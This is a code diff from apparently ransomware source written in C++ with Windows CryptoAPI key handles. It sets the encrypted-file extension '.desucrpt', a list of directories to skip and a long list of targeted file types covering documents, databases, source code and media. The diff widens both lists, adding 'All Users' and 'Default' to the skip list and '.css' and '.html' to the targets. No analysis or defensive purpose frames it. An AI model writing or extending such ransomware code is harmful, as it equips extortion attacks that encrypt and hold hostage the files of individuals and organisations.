@@ -6,14 +6,17 @@ std::vector<std::wstring> filesDB;
 _WIN32_FIND_DATAW curItem;
 TCHAR curPath[MAX_PATH];
 HCRYPTKEY keyHandle;
+//HANDLE statFileHandle;
 std::wstring keyContainerPath;
 HCRYPTKEY xchgKeyHandle;
 DWORD keyBlobLen;
 HCRYPTPROV provPtr;
 const std::wstring encExt = L".desucrpt";
-LPWSTR ignoreDirs[14] = {
+LPWSTR ignoreDirs[16] = {
 	L"..",
 	L".",
+	L"Default",
+	L"All Users",
 	L"Content.IE5",
 	L"Temporary Internet Files",
 	L"Local Settings",
@@ -27,7 +30,7 @@ LPWSTR ignoreDirs[14] = {
 	L"Intel",
 	L"$Recycle.Bin"
 };
-LPWSTR fileExts[181] = {
+LPWSTR fileExts[183] = {
 	L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx", L".pst",
 	L".ost", L".msg", L".eml", L".vsd", L".vsdx", L".txt", L".csv",
 	L".rtf", L".123", L".wks", L".wk1", L".pdf", L".dwg", L".onetoc2",
@@ -44,7 +47,8 @@ LPWSTR fileExts[181] = {
 	L".mpeg", L".vob", L".mpg", L".wmv", L".fla", L".swf", L".wav", L".mp3",
 	L".sh", L".class", L".jar", L".java", L".rb", L".asp", L".php", L".jsp",
 	L".brd", L".sch", L".dch", L".dip", L".pl", L".vb", L".vbs", L".py",
-	L".ps1", L".bat", L".cmd", L".js", L".asm", L".h", L".pas", L".cpp",L".c",
+	L".ps1", L".bat", L".cmd", L".js", L".asm", L".h", L".pas", L".cpp",L".c",L".css",
+	L".html",
 	L".cs", L".suo", L".sln", L".ldf", L".mdf", L".ibd", L".myi", L".myd", L".frm",
 	L".odb", L".dbf", L".db", L".mdb", L".accdb", L".sql", L".sqlitedb", L".sqlite3",
 	L".asc", L".lay6", L".lay", L".mml", L".sxm", L".otg", L".odg", L".uop", L".std",
